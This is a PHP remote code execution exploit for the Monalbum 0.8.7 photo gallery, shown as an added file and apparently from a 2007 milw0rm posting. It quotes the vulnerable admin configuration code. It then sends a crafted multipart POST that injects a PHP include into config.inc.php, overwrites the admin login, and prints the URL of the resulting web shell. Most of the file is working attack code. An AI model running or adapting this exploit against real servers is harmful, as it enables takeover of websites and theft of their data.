@@ -1,0 +1,374 @@
+<?php
+
+/*
+        \\\|///
+      \\  - -  //
+       (  @ @ )
+----oOOo--(_)-oOOo---------------------------------------------------
+
+[ Y! Underground Group ]
+[   Dj7xpl@yahoo.com   ]
+[    Dj7xpl.2600.ir    ]
+
+----ooooO-----Ooooo--------------------------------------------------
+    (   )     (   )
+     \ (       ) /
+      \_)     (_/
+
+---------------------------------------------------------------------
+
+[!] Portal   :   Monalbum 0.8.7
+[!] Download :   http://www.3dsrc.com/monalbum/
+[!] Type     :   Remote Code Execution Exploit
+
+---------------------------------------------------------------------
+*/
+
+/*
+Vuln Code :
+
+[Code]
+
+<?
+	include("./secure.php");
+
+	$glangage = $_POST['glangage'];	
+	if (!isset($glangage)) include("../conf/config.inc.php"); // inclut pas qd sauvegarde
+	
+	include ("../lib/album.inc");  
+	include_once("../lang/$glangage");
+	
+
+	$mod = $_POST['mod'];
+
+  echo "<html><head><link rel=stylesheet type='text/css' href='../css/album.css'></head><body bgcolor='FFFFFF'>";
+
+ if (isset($mod)) { //submit
+   $fichier = "../conf/config.inc.php";
+   $fd = fopen($fichier, "w");
+
+	$gcfgBase = $_POST['gcfgBase'];
+	$gcfgUser = $_POST['gcfgUser'];
+	$gcfgPass = $_POST['gcfgPass'];
+	$gcfgHote = $_POST['gcfgHote'];
+	
+	$gpage       = $_POST['gpage'];
+	$grepertoire = $_POST['grepertoire'];
+	$gfond       = $_POST['gfond'];
+	$gtitre      = $_POST['gtitre'];
+	$gcontour    = $_POST['gcontour'];
+	
+	$gsite         = $_POST['gsite'];
+	$gracine       = $_POST['gracine'];
+	$ghome         = $_POST['ghome'];
+	$ghor          = $_POST['ghor'];
+	$gvert         = $_POST['gvert'];	
+	$grep_mini     = $_POST['grep_mini'];
+	$gmini_hasard  = $_POST['gmini_hasard'];
+	$gmenu_visible = $_POST['gmenu_visible'];
+	$gslide        = $_POST['gslide'];
+	
+	$gadm_user   = $_POST['gadm_user'];
+	$gadm_pass   = $_POST['gadm_pass'];
+
+	$ggd_version  = $_POST['ggd_version'];
+	$glangage     = $_POST['glangage'];
+	$gversion     = $_POST['gversion'];
+
+	$guse_copyright = $_POST['guse_copyright'];
+	$gimg_copyright = $_POST['gimg_copyright'];
+
+	$gordre_rep      = $_POST['gordre_rep'];
+	$gclassement_rep = $_POST['gclassement_rep'];
+	
+	$grech_inactive   = $_POST['grech_inactive'];
+	
+   $chaine = "<?
+	//  ---------- BASE DE DONNEES MYSQL Mysql database----------
+	\$gcfgBase = \"$gcfgBase\";  // nom de la base de données - database name
+	\$gcfgUser = \"$gcfgUser\";  // utilisateur - user
+	\$gcfgPass = \"$gcfgPass\";  // mot de passe  - password
+	\$gcfgHote = \"$gcfgHote\"; // serveur mysql - mysql host
+
+	// ---------- CONFIGURATION -------------------
+	\$gpage       = \"$gpage\"; // couleur du fond de la page - backgroundcolor
+	\$grepertoire = \"$grepertoire\"; // couleur des répertoires - color of the folders
+	\$gfond       = \"$gfond\";
+	\$gtitre      = \"$gtitre\";
+	\$gcontour    = \"$gcontour\"; // couleur du contour - name of the contour
+
+	\$gsite         = \"$gsite\"; // nom du site - name of website
+	\$gracine       = \"$gracine\"; // nom de la racine - name of the root
+	\$ghome         = \"$ghome\"; // adresse de la page d'accueil - adress of the homepage
+	\$ghor          = \"$ghor\"; // nombre d'images horizontal - number of horizontal pictures
+	\$gvert         = \"$gvert\"; // nombre d'images vertical - number of vertical pictures
+	\$grep_mini     = \"$grep_mini\";  // les répertoires doivent-ils apparaître en miniatures ? - Does the folders appear like thumbnails
+	\$gmini_hasard  = \"$gmini_hasard\"; // les miniatures des répertoires sont-elles prises au hasard ? - The thumbnails of the folders are random displayed ?
+	\$gmenu_visible = \"$gmenu_visible\"; // le menu doit-il être visible ? - Does the menu be visible ?
+	\$gslide        = \"$gslide\"; // Voulez vous l'option de diaporama ? - Does the slide option be visible ?
+	\$gordre_rep    = \"$gordre_rep\"; // ordre d'affichage des rubriques par nom ou index (locus) - Displaying order of the folder by name or index (locus)
+	\$gclassement_rep = \"$gclassement_rep\"; // classement des rubriques ASC ou DESC - classification of the folder ASC or DESC
+	\$grech_inactive = \"$grech_inactive\"; // Déactiver la recherche - disabled the research capabilities
+	
+	\$gadm_user  = \"$gadm_user\";
+	\$gadm_pass  = \"$gadm_pass\";
+
+	\$ggd_version = \"$ggd_version\"; // GD = bibliothèque graphique - GD = graphical library
+	\$glangage    = \"$glangage\";
+	\$gversion    = \"$gversion\"; // version du programme - program version
+
+	\$guse_copyright = \"$guse_copyright\" ; // Indique si doit rajouter une image de droits d'auteur (copyright) sur chaque image de l'album -  Tells if must add a copyright picture on each picture of the album.
+	\$gimg_copyright = \"$gimg_copyright\";  // Image à utiliser pour les droits d'auteur (copyright) -	Picture to use for the copyright.												
+	
+	
+	?>";
+   
+   fwrite ( $fd, $chaine);
+   fclose($fd);   
+[/Code]
+*/
+
+if ($argc<2) {
+print_r('
+-----------------------------------------------------------------------------
+
+Usage: php '.$argv[0].' Host Path Options
+host:       Target server (ip/hostname)
+path:       Path To Folder
+
+Options:
+ -p[port]:    specify a port other than 80
+ -P[ip:port]: specify a proxy
+
+Example:
+php '.$argv[0].' 127.0.0.1 /Gallery/ -P1.1.1.1:80
+
+-----------------------------------------------------------------------------
+');
+
+die;
+}
+
+error_reporting(0);
+ini_set("max_execution_time",0);
+ini_set("default_socket_timeout",5);
+
+function quick_dump($string)
+{
+  $result='';$exa='';$cont=0;
+  for ($i=0; $i<=strlen($string)-1; $i++)
+  {
+   if ((ord($string[$i]) <= 32 ) | (ord($string[$i]) > 126 ))
+   {$result.="  .";}
+   else
+   {$result.="  ".$string[$i];}
+   if (strlen(dechex(ord($string[$i])))==2)
+   {$exa.=" ".dechex(ord($string[$i]));}
+   else
+   {$exa.=" 0".dechex(ord($string[$i]));}
+   $cont++;if ($cont==15) {$cont=0; $result.="\r\n"; $exa.="\r\n";}
+  }
+ return $exa."\r\n".$result;
+}
+$proxy_regex = '(\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\:\d{1,5}\b)';
+function sendpacket($packet)
+{
+  global $proxy, $host, $port, $html, $proxy_regex;
+  if ($proxy=='') {
+    $ock=fsockopen(gethostbyname($host),$port);
+    if (!$ock) {
+      echo 'No response from '.$host.':'.$port; die;
+    }
+  }
+  else {
+	$c = preg_match($proxy_regex,$proxy);
+    if (!$c) {
+      echo 'Not a valid proxy...';die;
+    }
+    $parts=explode(':',$proxy);
+    echo "Connecting to ".$parts[0].":".$parts[1]." proxy...\r\n";
+    $ock=fsockopen($parts[0],$parts[1]);
+    if (!$ock) {
+      echo 'No response from proxy...';die;
+	}
+  }
+  fputs($ock,$packet);
+  if ($proxy=='') {
+    $html='';
+    while (!feof($ock)) {
+      $html.=fgets($ock);
+    }
+  }
+  else {
+    $html='';
+    while ((!feof($ock)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$html))) {
+      $html.=fread($ock,1);
+    }
+  }
+  fclose($ock);
+}
+function make_seed()
+{
+   list($usec, $sec) = explode(' ', microtime());
+   return (float) $sec + ((float) $usec * 100000);
+}
+
+$host=$argv[1];
+$path=$argv[2];
+$port=80;
+$proxy="";
+for ($i=7; $i<$argc; $i++){
+$temp=$argv[$i][0].$argv[$i][1];
+if (($temp<>"-p") and ($temp<>"-P")) {$cmd.=" ".$argv[$i];}
+if ($temp=="-p")
+{
+  $port=str_replace("-p","",$argv[$i]);
+}
+if ($temp=="-P")
+{
+  $proxy=str_replace("-P","",$argv[$i]);
+}
+}
+if ($proxy=='') {$p=$path;} else {$p='http://'.$host.':'.$port.$path;}
+
+/*Data*/
+
+$data.='-----------------------------7d6224c08dc
+Content-Disposition: form-data; name="smod"
+
+
+-----------------------------7d6224c08dc
+Content-Disposition: form-data; name="gcfgBase"
+
+www";include "$shell";//
+-----------------------------7d6224c08dc
+Content-Disposition: form-data; name="gcfgUser"
+
+root
+-----------------------------7d6224c08dc
+Content-Disposition: form-data; name="gcfgPass"
+
+pass
+-----------------------------7d6224c08dc
+Content-Disposition: form-data; name="gcfgHote"
+
+red
+-----------------------------7d6224c08dc
+Content-Disposition: form-data; name="gpage"
+
+123
+-----------------------------7d6224c08dc
+Content-Disposition: form-data; name="grepertoire"
+
+red
+-----------------------------7d6224c08dc
+Content-Disposition: form-data; name="gfond"
+
+#CCFF00
+-----------------------------7d6224c08dc
+Content-Disposition: form-data; name="gtitre"
+
+Y! Underground Group
+-----------------------------7d6224c08dc
+Content-Disposition: form-data; name="gcontour"
+
+111
+-----------------------------7d6224c08dc
+Content-Disposition: form-data; name="gsite"
+
+11122
+-----------------------------7d6224c08dc
+Content-Disposition: form-data; name="ghome"
+
+red
+-----------------------------7d6224c08dc
+Content-Disposition: form-data; name="ghor"
+
+red
+-----------------------------7d6224c08dc
+Content-Disposition: form-data; name="gvert"
+
+red
+-----------------------------7d6224c08dc
+Content-Disposition: form-data; name="grep_mini"
+
+red
+-----------------------------7d6224c08dc
+Content-Disposition: form-data; name="gmini_hasard"
+
+red
+-----------------------------7d6224c08dc
+Content-Disposition: form-data; name="gmenu_visible"
+
+red
+-----------------------------7d6224c08dc
+Content-Disposition: form-data; name="gslide"
+
+red
+-----------------------------7d6224c08dc
+Content-Disposition: form-data; name="gadm_user"
+
+Dj7xpl
+-----------------------------7d6224c08dc
+Content-Disposition: form-data; name="gadm_pass"
+
+Dj7xpl
+-----------------------------7d6224c08dc
+Content-Disposition: form-data; name="ggd_version"
+
+red
+-----------------------------7d6224c08dc
+Content-Disposition: form-data; name="glangage"
+
+red
+-----------------------------7d6224c08dc
+Content-Disposition: form-data; name="gversion"
+
+red
+-----------------------------7d6224c08dc
+Content-Disposition: form-data; name="guse_copyright"
+
+red
+-----------------------------7d6224c08dc
+Content-Disposition: form-data; name="gimg_copyright"
+
+red
+-----------------------------7d6224c08dc
+Content-Disposition: form-data; name="gordre_rep"
+
+red
+-----------------------------7d6224c08dc
+Content-Disposition: form-data; name="gclassement_rep"
+
+red
+-----------------------------7d6224c08dc
+Content-Disposition: form-data; name="grech_inactive"
+
+red
+-----------------------------7d6224c08dc
+';
+
+
+/*Echo Header*/
+echo "[!] Monalbum 0.8.7 Remote Code Execution Exploit\r\n";
+echo "[!] Powered By Y! Underground Group\r\n";
+echo "[!] Vuln And Coded By Dj7xpl\r\n";
+
+/*Sending Data*/
+$packet ="POST ".$p."admin/admin_configuration.php HTTP/1.0\r\n";
+$packet.="Content-Type: multipart/form-data; boundary=---------------------------7d6224c08dc\r\n";
+$packet.="Content-Length: ".strlen($data)."\r\n";
+$packet.="Host: ".$host."\r\n";
+$packet.="Cookie: PHPSESSID=95d2528efe9bc32210dbdd815ddb466b;\r\n";
+$packet.="Accept-Language: fa\r\n";
+$packet.="Referer: http://".$host.$path."admin.php\r\n";
+$packet.="User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)\r\n";
+$packet.="Connection: Close\r\n\r\n";
+$packet.=$data;
+sendpacket($packet);
+sleep(2);
+Echo "[!] Shell : http://".$host.$path."conf/config.inc.php?shell=Evil Text\r\n";
+
+?>
+
+# milw0rm.com [2007-05-11]
